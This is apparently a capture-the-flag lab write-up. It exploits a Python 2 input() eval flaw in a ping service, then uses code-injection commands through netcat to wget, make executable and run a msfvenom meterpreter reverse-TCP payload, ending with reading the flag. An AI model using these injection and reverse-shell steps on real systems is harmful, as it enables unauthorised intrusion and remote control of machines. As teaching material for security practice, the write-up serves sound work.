#getting started
{% highlight bash %}
nmap -T4 -A -v -p0-65535 192.168.0.8 -oN nmap-results.txt
{% endhighlight %}

Looks like services are running, ports 10000 and 10001

#10000
Running:

{% highlight bash %}
nc 192.168.0.9 10000
{% endhighlight %}

provides a prompt asking for a number of packets, let's try 1, this appears
to be a service that pings localhost.

Now to try some non-numeric input, this spits out an error:

{% highlight bash %}
Traceback (most recent call last):
  File "./ping.py", line 3, in <module>
    num_packets = int(input(' Please enther number of packets: '))
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
{% endhighlight %}

Time for some research, I tried searching for: python 2 input(), looks like this
is an unsafe method, at least the way it is being used here.  In this case the
input that is supplied for a number of packets ends up being evaluated as a
string of python code.

Lets try something else:
{% highlight bash %}
echo "__import__('os').system('ls -latr')" | nc 192.168.0.14 10000
{% endhighlight %}

Here we are sending the string:
{% highlight python %}
__import__('os').system('ls -latr')
{% endhighlight %}

for evaluation by the python interpreter on the machine running this service,
for the purpose of testing the shell command ls -latr is being passed down, and
in return the output is the home directory of the user running our service.  At
this point we can start executing commands, looks like its time to generate a
payload to pull down to the remote machine.

Next I create a meterpreter for reverse_tcp handling using msfvenom:

{% highlight bash %}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.11 LPORT=4444 -f elf > basement-meterpreter
{% endhighlight %}

Now to get the payload onto the host:

{% highlight bash %}
python -m SimpleHTTPServer
{% endhighlight %}

then while the server is running:

{% highlight bash %}
echo "__import__('os').system('wget -O /tmp/meterpreter http://192.168.0.11:8000/basement-meterpreter')" | nc 192.168.0.9 10000
echo "__import__('os').system('chmod a+x /tmp/meterpreter')" | nc 192.168.0.9 10000
echo "__import__('os').system('ls -latr /tmp')" | nc 192.168.0.9 10000
echo "__import__('os').system('/tmp/meterpreter &')" | nc 192.168.0.9 10000
{% endhighlight %}

These commands (in order) will to the following:
- grab the file we generated with msfvenom and throw it into /tmp with the name meterpreter
- change the meterpreter payload to be executable
- validate the file exists in the given location and is executable

Next in MSF run:
{% highlight bash %}
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.0.11
set LPORT 4444
run
{% endhighlight %}

Now hop back over to the terminal and run:
{% highlight bash %}
echo "__import__('os').system('/tmp/meterpreter &')" | nc 192.168.0.9 10000
{% endhighlight %}

Now back in MSF we'll have an active command line and can run:

{% highlight bash %}
ls -latr
{% endhighlight %}

the output shows flag.txt, executing: cat flag.txt we get:

{% highlight bash %}
flag{j4cks_t0t4l_l4cK_0f_$uRpr1sE}
{% endhighlight %}
